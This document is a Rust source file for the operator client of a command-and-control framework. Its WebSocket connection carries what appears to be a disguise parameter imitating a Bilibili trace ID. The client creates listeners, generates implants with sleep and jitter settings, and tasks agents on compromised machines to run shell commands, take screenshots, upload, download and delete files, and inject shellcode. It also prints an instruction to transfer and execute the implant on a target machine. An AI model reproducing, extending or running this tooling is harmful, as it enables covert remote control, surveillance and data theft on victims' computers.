use clap::{ArgMatches, Command};
use colored::Colorize;
use encoding_rs::GBK;
use flate2::write::{GzDecoder, GzEncoder};
use flate2::Compression;
use futures_util::{SinkExt, StreamExt};
use rustyline::completion::FilenameCompleter;
use rustyline::config::Configurer;
use rustyline::error::ReadlineError;
use rustyline::highlight::{CmdKind, Highlighter, MatchingBracketHighlighter};
use rustyline::hint::{Hint, Hinter, HistoryHinter};
use rustyline::history::DefaultHistory;
use rustyline::validate::MatchingBracketValidator;
use rustyline::{
    Cmd, ColorMode, CompletionType, Config, Context, DefaultEditor, EditMode, Editor, KeyEvent,
    Result,
};
use rustyline_derive::{FileCompleter, Helper, Highlighter, Hinter, Validator};
use spinners::{Spinner, Spinners};
use std::borrow::Cow;
use std::borrow::Cow::{Borrowed, Owned};
use std::collections::HashSet;
use std::ffi::OsStr;
use std::io::Write;
use std::path::Path;
use std::{
    fs, io, process,
    sync::{Arc, Mutex},
};
use tokio_tungstenite::tungstenite::client::IntoClientRequest;
use tokio_tungstenite::{connect_async, connect_async_with_config, tungstenite::http::{HeaderValue, Request}, tungstenite::protocol::Message};

use super::cli::cmd::create_cmd;
use super::operations::{set_operations, Operation};
use super::options::options::Options;
use super::prompt::set_prompt;
use crate::utils::fs::{get_app_dir, read_json, write_file};

const EXIT_SUCCESS: i32 = 0;
// const EXIT_FAILURE: i32 = 0;

#[derive(FileCompleter, Helper, Validator, Highlighter)]
struct DIYHinter {
    hints: HashSet<CommandHint>,
}

#[derive(Hash, Debug, PartialEq, Eq)]
struct CommandHint {
    display: String,
    complete_up_to: usize,
}

impl Hint for CommandHint {
    fn display(&self) -> &str {
        &self.display
    }

    fn completion(&self) -> Option<&str> {
        if self.complete_up_to > 0 {
            Some(&self.display[..self.complete_up_to])
        } else {
            None
        }
    }
}

impl CommandHint {
    fn new(text: &str, complete_up_to: &str) -> Self {
        Self {
            display: text.into(),
            complete_up_to: complete_up_to.len(),
        }
    }

    fn suffix(&self, strip_chars: usize) -> Self {
        Self {
            display: self.display[strip_chars..].to_owned(),
            complete_up_to: self.complete_up_to.saturating_sub(strip_chars),
        }
    }
}

impl Hinter for DIYHinter {
    type Hint = CommandHint;

    fn hint(&self, line: &str, pos: usize, _ctx: &Context<'_>) -> Option<CommandHint> {
        if line.is_empty() || pos < line.len() {
            return None;
        }

        self.hints
            .iter()
            .filter_map(|hint| {
                // expect hint after word complete, like redis cli, add condition:
                // line.ends_with(" ")
                if hint.display.starts_with(line) {
                    Some(hint.suffix(pos))
                } else {
                    None
                }
            })
            .next()
    }
}

fn diy_hints() -> HashSet<CommandHint> {
    let mut set = HashSet::new();
    set.insert(CommandHint::new("help", "help"));
    set.insert(CommandHint::new("listener", "listener"));
    set.insert(CommandHint::new("delete", "delete"));
    set.insert(CommandHint::new("implant", "implant"));
    set.insert(CommandHint::new("agent", "agent"));
    set.insert(CommandHint::new("upload", "upload"));
    set
}

#[derive(Debug)]
struct Commands {
    pub op: Operation,
    pub options: Options,
}

impl Commands {
    fn new(op: Operation, options: Options) -> Self {
        Self { op, options }
    }
}

pub enum Mode {
    Root,
    Agent(String, String),
}

pub struct Client {
    pub server_host: String,
    pub server_port: u16,

    pub mode: Mode,
}

impl Client {
    pub fn new(server_host: String, server_port: u16) -> Self {
        Self {
            server_host,
            server_port,
            mode: Mode::Root,
        }
    }

    // General CLI
    fn cli(&self) -> Command {
        create_cmd(self)
    }

    fn parse_args(&self, args: &[String]) -> clap::error::Result<Option<Commands>> {
        let matches = self.cli().try_get_matches_from(args)?;
        self.parse_matches(&matches)
    }

    fn parse_matches(&self, matches: &ArgMatches) -> clap::error::Result<Option<Commands>> {
        let (op, options) = set_operations(self, matches);

        Ok(Some(Commands::new(op, options)))
    }

    pub async fn run(&mut self) -> Result<()> {
        // Connect to C2 server.
        let server_url = format!(
            "ws://{}:{}{}?x-bili-trace-id={}&username={}",
            self.server_host.to_owned(),
            self.server_port.to_owned(),
            read_json("server-config","websocket-url").as_str(),
            read_json("server-config","x-bili-trace-id").as_str(),
            read_json("server-config","username").as_str(),
        );

        let ws_stream = match connect_async(server_url.clone()).await {
            Ok((stream, _response)) => {
                println!("{} Handshake has been completed.", "[+]".green());
                stream
            }
            Err(e) => {
                println!(
                    "{} WebSocket handshake failed: {}",
                    "[x]".red(),
                    e.to_string()
                );
                return Ok(());
            }
        };

        println!(
            "{} Connected to C2 server ({}) successfully.",
            "[+]".green(),
            server_url.to_string()
        );

        let (mut sender, receiver) = ws_stream.split();

        // Client commands
        let h = DIYHinter { hints: diy_hints() };
        let mut rl: Editor<DIYHinter, DefaultHistory> = Editor::new()?;
        rl.set_helper(Some(h));
        #[cfg(feature = "with-file-history")]
        if rl.load_history("history.txt").is_err() {
            // println!("No previous history.");
        }

        let receiver = Arc::new(Mutex::new(receiver));

        loop {
            let mut message = Message::Text("".to_owned());
            let mut send_flag = String::new();

            println!();
            let readline = rl.readline(set_prompt(&self.mode).as_str());
            match readline {
                Ok(line) => {
                    // Handle input
                    let _ = rl.add_history_entry(line.as_str());
                    let mut args = match shellwords::split(&line) {
                        Ok(args) => args,
                        Err(err) => {
                            eprintln!("Can't parse command line: {err}");
                            vec!["".to_string()]
                        }
                    };
                    args.insert(0, "client".into());
                    // Parse options
                    let commands = match self.parse_args(&args) {
                        Ok(commands) => commands,
                        Err(err) => {
                            println!("{}", err);
                            continue;
                        }
                    };

                    if let Some(commands) = commands {
                        match &commands.op {
                            // Root operation
                            // Listener
                            Operation::AddListener => {
                                if let Some(listener_opt) = commands.options.listener_opt {
                                    message = Message::Text(format!(
                                        "listener add {} {} {}://{}:{}/",
                                        listener_opt.name.unwrap(),
                                        listener_opt.domains.unwrap().join(","),
                                        listener_opt.proto.unwrap(),
                                        listener_opt.host.unwrap(),
                                        listener_opt.port.unwrap()
                                    ));
                                    send_flag = "[listener:add] Adding the listener...".to_string();
                                } else {
                                    println!("Invalid command. Run `add help` for the usage.");
                                    continue;
                                }
                            }
                            Operation::DeleteListener => {
                                if let Some(listener_opt) = commands.options.listener_opt {
                                    if let Some(name) = listener_opt.name {
                                        message =
                                            Message::Text(format!("listener delete {}", name));
                                        send_flag = "[listener:delete] Deleting the listener..."
                                            .to_string();
                                    } else {
                                        println!("Specify target listener by ID or name.");
                                    }
                                } else {
                                    continue;
                                }
                            }
                            Operation::StartListener => {
                                if let Some(listener_opt) = commands.options.listener_opt {
                                    if let Some(name) = listener_opt.name {
                                        message = Message::Text(format!("listener start {}", name));
                                        send_flag =
                                            "[listener:start] Starting the listener...".to_string();
                                    } else {
                                        println!("Specify target listener by ID or name.");
                                    }
                                } else {
                                    continue;
                                }
                            }
                            Operation::StopListener => {
                                if let Some(listener_opt) = commands.options.listener_opt {
                                    if let Some(name) = listener_opt.name {
                                        message = Message::Text(format!("listener stop {}", name));
                                        send_flag =
                                            "[listener:stop] Stopping the listener...".to_string();
                                    } else {
                                        println!("Specify target listener by ID or name.");
                                        continue;
                                    }
                                } else {
                                    continue;
                                }
                            }
                            Operation::InfoListener => {
                                if let Some(listener_opt) = commands.options.listener_opt {
                                    if let Some(name) = listener_opt.name {
                                        message = Message::Text(format!("listener info {}", name));
                                        send_flag =
                                            "[listener:info] Getting the listener information..."
                                                .to_string();
                                    } else {
                                        println!("Specify target listener by ID or name.");
                                        continue;
                                    }
                                } else {
                                    continue;
                                }
                            }
                            Operation::ListListeners => {
                                message = Message::Text("listener list".to_string());
                                send_flag =
                                    "[listener:list] Getting the listener list...".to_string()
                            }
                            // Agent
                            Operation::UseAgent => {
                                if let Some(agent_opt) = commands.options.agent_opt {
                                    let ag_name = agent_opt.name;

                                    // Check if the agent exists
                                    message = Message::Text(format!("agent use {}", ag_name));
                                    send_flag =
                                        "[agent:use] Switching to the agent mode...".to_string();
                                }
                            }
                            Operation::DeleteAgent => {
                                if let Some(agent_opt) = commands.options.agent_opt {
                                    let ag_name = agent_opt.name;
                                    message = Message::Text(format!("agent delete {}", ag_name));
                                    send_flag = "[agent:delete] Deleting the agent...".to_string();
                                }
                            }
                            Operation::InfoAgent => {
                                if let Some(agent_opt) = commands.options.agent_opt {
                                    let ag_name = agent_opt.name;
                                    message = Message::Text(format!("agent info {}", ag_name));
                                    send_flag =
                                        "[agent:info] Getting the agent information...".to_string();
                                }
                            }
                            Operation::ListAgents => {
                                message = Message::Text("agent list".to_string());
                                send_flag = "[agent:list] Getting the agent list...".to_string();
                            }
                            // Implant
                            Operation::GenerateImplant => {
                                if let Some(implant_opt) = commands.options.implant_opt {
                                    let name = implant_opt.name.unwrap();
                                    let url = implant_opt.url.unwrap();
                                    let os = implant_opt.os.unwrap();
                                    let arch = implant_opt.arch.unwrap();
                                    let format = implant_opt.format.unwrap();
                                    let sleep = implant_opt.sleep.unwrap();
                                    let jitter = implant_opt.jitter.unwrap();

                                    message = Message::Text(format!(
                                        "implant gen {} {} {} {} {} {} {}",
                                        name, url, os, arch, format, sleep, jitter
                                    ));
                                    send_flag =
                                        "[implant:gen] Generating the implant...".to_string();
                                } else {
                                    continue;
                                }
                            }
                            Operation::DownloadImplant => {
                                if let Some(implant_opt) = commands.options.implant_opt {
                                    let name = implant_opt.name.unwrap();

                                    message = Message::Text(format!("implant download {}", name));
                                    send_flag =
                                        "[implant:download] Downloading the implant...".to_string();
                                } else {
                                    continue;
                                }
                            }
                            Operation::DeleteImplant => {
                                if let Some(implant_opt) = commands.options.implant_opt {
                                    let name = implant_opt.name.unwrap();

                                    message = Message::Text(format!("implant delete {}", name));
                                    send_flag =
                                        "[implant:delete] Deleting the implant...".to_string();
                                }
                            }
                            Operation::InfoImplant => {
                                if let Some(implant_opt) = commands.options.implant_opt {
                                    let name = implant_opt.name.unwrap();

                                    message = Message::Text(format!("implant info {}", name));
                                    send_flag =
                                        "[implant:info] Getting the information of implant..."
                                            .to_string();
                                }
                            }
                            Operation::ListImplants => {
                                message = Message::Text("implant list".to_string());
                                send_flag =
                                    "[implant:list] Getting the implant list...".to_string();
                            }
                            // Misc
                            Operation::Empty => {
                                continue;
                            }
                            Operation::Exit => {
                                process::exit(EXIT_SUCCESS);
                            }
                            Operation::Unknown => {
                                println!(
                                    "{} Unknown command. Run `help` for the usage.",
                                    "[!]".yellow()
                                );
                                continue;
                            }

                            // Agent operations
                            // Tasks
                            Operation::AgentTaskCd => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let t_args = task_opt.args.unwrap();
                                message = Message::Text(format!("task {} cd {}", t_agent, t_args));
                                send_flag =
                                    "[task:set] Sending the task and waiting for the result..."
                                        .to_string();
                            }
                            Operation::AgentTaskLs => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let t_args = task_opt.args.unwrap();
                                message = Message::Text(format!("task {} ls {}", t_agent, t_args));
                                send_flag =
                                    "[task:set] Sending the task and waiting for the result..."
                                        .to_string();
                            }
                            Operation::AgentTaskPwd => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                message = Message::Text(format!("task {} pwd", t_agent));
                                send_flag =
                                    "[task:set] Sending the task and waiting for the result..."
                                        .to_string();
                            }
                            Operation::AgentTaskScreenshot => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                message = Message::Text(format!("task {} screenshot", t_agent));
                                send_flag =
                                    "[task:set] Sending the task and waiting for the result..."
                                        .to_string();
                            }
                            Operation::AgentTaskShell => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let t_args = task_opt.args.unwrap();
                                message =
                                    Message::Text(format!("task {} shell {}", t_agent, t_args));
                                send_flag = "[task:set] Sending the task...".to_string();
                            }
                            Operation::AgentTaskSleep => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let t_args = task_opt.args.unwrap();
                                message =
                                    Message::Text(format!("task {} sleep {}", t_agent, t_args));
                                send_flag = "[task:set] Sending the task...".to_string();
                            }
                            Operation::AgentTaskUpload => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let t_args = task_opt.args.unwrap();
                                let gzip_data: Vec<u8>;
                                let path = Path::new(&t_args);

                                let qi5l = path.file_name().unwrap().to_string_lossy().to_string();
                                let file_path = path.to_string_lossy().to_string();

                                match is_file(&file_path) {
                                    Ok(true) => {
                                        let data = fs::read(&file_path)?;
                                        gzip_data = compress_to_gzip(&data)?;
                                    }
                                    Ok(false) => {
                                        println!("路径 '{}' 是一个文件夹路径！", &file_path);
                                        continue;
                                    }
                                    Err(e) => {
                                        println!("无法判断路径 '{}': {} ", &file_path, e);
                                        continue;
                                    }
                                }
                                let gzip_data_qi4l = base64::encode(&gzip_data);

                                message = Message::Text(format!(
                                    "task {} upload {},{}",
                                    t_agent, qi5l, gzip_data_qi4l
                                ));
                                send_flag = "[task:set] Sending the task...".to_string();
                            }
                            Operation::AgentTaskDownload => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let t_args = task_opt.args.unwrap();
                                message =
                                    Message::Text(format!("task {} download {}", t_agent, t_args));
                                send_flag = "[task:set] Sending the task...".to_string();
                            }
                            Operation::AgentTaskWhoami => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                message = Message::Text(format!("task {} whoami", t_agent));
                                send_flag =
                                    "[task:set] Sending the task and waiting for the result..."
                                        .to_string();
                            }
                            Operation::AgentTaskRm => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let t_args = task_opt.args.unwrap();
                                message = Message::Text(format!("task {} rm {}", t_agent, t_args));
                                send_flag = "[task:set] Sending the task...".to_string();
                            }
                            Operation::AgentTaskShellcode => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let file_path = task_opt.args.unwrap();
                                let path = Path::new(&file_path);
                                let file_path = path.to_string_lossy().to_string();
                                let data: Vec<u8>;

                                match is_file(&file_path) {
                                    Ok(true) => {
                                        data = fs::read(&file_path)?;
                                    }
                                    Ok(false) => {
                                        println!("路径 '{}' 是一个文件夹路径！", &file_path);
                                        continue;
                                    }
                                    Err(e) => {
                                        println!("无法判断路径 '{}': {} ", &file_path, e);
                                        continue;
                                    }
                                }

                                let shellcode_data_qi4l = base64::encode(&data);

                                message = Message::Text(format!(
                                    "task {} shellcode {}",
                                    t_agent, shellcode_data_qi4l
                                ));
                                send_flag = "[task:set] Sending the task...".to_string();
                            }
                            // Misc
                            Operation::AgentEmpty => {
                                continue;
                            }
                            Operation::AgentExit => {
                                println!("{} Exit the agent mode.", "[+]".green());
                                self.mode = Mode::Root;
                                continue;
                            }
                            Operation::AgentUnknown => {
                                println!(
                                    "{} Unknown command. Run `help` for the usage.",
                                    "[!]".yellow()
                                );
                                continue;
                            }
                        }
                    }
                }
                Err(ReadlineError::Interrupted) => break,
                Err(ReadlineError::Eof) => break,
                Err(err) => {
                    println!("[x] {} {:?}", "Error: ", err);
                    continue;
                }
            }

            // Send command
            // sender.send(Message::Text(line.to_owned())).await.expect("Can not send.");
            sender
                .send(message.to_owned())
                .await
                .expect("Can not send.");

            // Spinner while waiting for responses
            let mut spin: Option<Spinner> = None;
            match shellwords::split(&send_flag) {
                Ok(args) => {
                    spin = Some(Spinner::new(Spinners::Dots8, args[1..].join(" ")));
                }
                Err(_) => {}
            }

            // Receive responses
            let mut receiver_lock = receiver.lock().unwrap();
            let mut recv_flag = String::new();

            let mut all_bytes: Vec<u8> = Vec::new();

            while let Some(Ok(msg)) = receiver_lock.next().await {
                match msg {
                    Message::Text(text) => {
                        // Parse the text
                        let args = shellwords::split(&text).unwrap_or_else(|err| {
                            eprintln!("Can't parse the received message: {err}");
                            vec!["".to_string()]
                        });

                        match args[0].as_str() {
                            "[done]" => break,
                            "[listener:add:ok]"
                            | "[listener:delete:ok]"
                            | "[listener:start:ok]"
                            | "[listener:stop:ok]"
                            | "[listener:list:ok]"
                            | "[agent:delete:ok]"
                            | "[implant:delete:ok]" => {
                                stop_spin(&mut spin);
                                println!("{} {}", "[+]".green(), args[1..].join(" ").to_owned());
                            }
                            "[listener:add:error]"
                            | "[listener:delete:error]"
                            | "[listener:start:error]"
                            | "[listener:stop:error]"
                            | "[listener:info:error]"
                            | "[listener:list:error]"
                            | "[agent:use:error]"
                            | "[agent:delete:error]"
                            | "[agent:info:error]"
                            | "[agent:list:error]"
                            | "[implant:gen:error]"
                            | "[implant:delete:error]"
                            | "[implant:info:error]"
                            | "[implant:list:error]"
                            | "[task:error]" => {
                                stop_spin(&mut spin);
                                println!("{} {}", "[x]".red(), args[1..].join(" ").to_owned());
                            }
                            "[agent:use:ok]" => {
                                // Switch to the agent mode
                                self.mode = Mode::Agent(args[1].to_owned(), args[2].to_owned());
                                stop_spin(&mut spin);
                                println!(
                                    "{} The agent found. Switch to the agent mode.",
                                    "[+]".green()
                                );
                            }
                            "[implant:gen:ok:sending]"
                            | "[implant:gen:ok:complete]"
                            | "[task:screenshot:ok]"
                            | "[task:shell:ok]"
                            | "[task:download:ok]" => {
                                // Will receive binary data after that, so don't stop the spinner yet.
                                recv_flag = args.join(" ");
                            }
                            _ => {
                                stop_spin(&mut spin);
                                println!("{text}");
                            }
                        }
                    }
                    Message::Binary(bytes) => {
                        // Parse recv flag
                        let args = shellwords::split(&recv_flag).unwrap_or_else(|err| {
                            eprintln!("Can't parse command line: {err}");
                            vec!["".to_string()]
                        });

                        match args[0].as_str() {
                            "[implant:gen:ok:sending]" => {
                                all_bytes.extend(&bytes);
                            }
                            "[implant:gen:ok:complete]" => {
                                all_bytes.extend(&bytes);

                                let outfile = args[1].to_string();
                                write_file(outfile.to_string(), &all_bytes)?;
                                stop_spin(&mut spin);
                                let implant_path =
                                    format!("{}/{}", get_app_dir(), outfile).replace("\\", "/");
                                println!(
                                    "{} Implant generated at {}",
                                    "[+]".green(),
                                    implant_path.cyan()
                                );
                                println!(
                                    "{} Transfer this file to target machine and execute it to interact with our C2 server.",
                                    "[i]".green());
                            }
                            "[task:screenshot:ok]" => {
                                let outfile = args[1].to_string();
                                write_file(outfile.to_string(), &bytes)?;
                                stop_spin(&mut spin);
                                println!(
                                    "{} Screenshot saved at {}",
                                    "[+]".green(),
                                    format!("{}/{}", get_app_dir(), outfile.to_string()).cyan()
                                );
                            }
                            "[task:shell:ok]" => {
                                let result_string = match String::from_utf8(bytes.to_vec()) {
                                    Ok(s) => s,
                                    Err(_) => {
                                        let (gbk_result, _encoding_used, had_errors) =
                                            GBK.decode(&bytes);
                                        let gbk_string = gbk_result.into_owned();
                                        if had_errors {
                                            // warn!("GBK decoding error detected, some characters may have been replaced");
                                        }
                                        gbk_string
                                    }
                                };

                                stop_spin(&mut spin);
                                println!("{} {}", "[+]".green(), result_string);
                            }
                            "[task:download:ok]" => {
                                let result_string = String::from_utf8_lossy(&bytes).to_string();
                                let parts: Vec<&str> = result_string.split(',').collect();

                                let file_name: String = parts[0].parse().unwrap();
                                let gzip_data_qi4l: String = parts[1].parse().unwrap();
                                let gzip_data_qi5l = base64::decode(&gzip_data_qi4l).unwrap();

                                let decompressed_data = decompress_from_gzip(&gzip_data_qi5l);
                                match decompressed_data {
                                    Ok(decompressed_data) => {
                                        match fs::write(file_name.clone(), &decompressed_data) {
                                            Ok(_) => {}
                                            Err(e) => {
                                                // println!("Error writing file: {}", e);
                                            }
                                        };
                                    }
                                    Err(e) => {
                                        // println!("Error reading file: {}", e);
                                    }
                                }

                                let res = format!("File {} downloaded successfully", file_name);

                                stop_spin(&mut spin);
                                println!("{} {}", "[+]".green(), res);
                            }
                            _ => {}
                        }
                    }
                    Message::Close(c) => {
                        if let Some(cf) = c {
                            println!("Close with code {} and reason `{}`", cf.code, cf.reason);
                        } else {
                            println!("Somehow got close message without CloseFrame");
                        }
                        process::exit(EXIT_SUCCESS);
                    }
                    Message::Frame(_) => {
                        unreachable!("This is never supposed to happen")
                    }
                    _ => break,
                }
            }
        }

        #[cfg(feature = "with-file-history")]
        rl.save_history("history.txt").expect("TODO: panic message");

        Ok(())
    }
}

fn stop_spin(spin: &mut Option<Spinner>) {
    if let Some(spin) = spin {
        spin.stop();
        println!(); // Add newline for good appearance.
    }
}

fn is_file(path: &str) -> std::result::Result<bool, io::Error> {
    let metadata = fs::metadata(path)?;
    Ok(metadata.is_file())
}

fn compress_to_gzip(data: &[u8]) -> io::Result<Vec<u8>> {
    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(data)?;
    encoder.finish()
}

fn decompress_from_gzip(data: &[u8]) -> io::Result<Vec<u8>> {
    let mut decoder = GzDecoder::new(Vec::new());
    decoder.write_all(data)?;
    decoder.finish()
}
